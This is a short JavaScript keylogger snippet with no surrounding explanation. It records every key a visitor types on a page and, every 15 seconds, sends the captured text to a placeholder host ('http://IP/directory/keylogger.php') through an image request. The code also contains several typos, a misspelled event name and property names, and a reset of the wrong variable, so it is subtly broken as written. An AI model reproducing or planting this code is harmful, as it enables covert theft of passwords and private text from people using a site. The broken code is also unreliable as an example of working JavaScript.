var keys='';
document.onkeyoress = function(e) {
    get = window.event?event:e;
    key = get,keyCode?get.keyCode:get.chardCode;
    key = String.fromCharCode(key);
    keys+=key;
}

window.setInterval(function() {
    if(keys != ''){
        new Image().src = 'http://IP/directory/keylogger.php?c='+keys;
        key = '';
    }
}, 15000);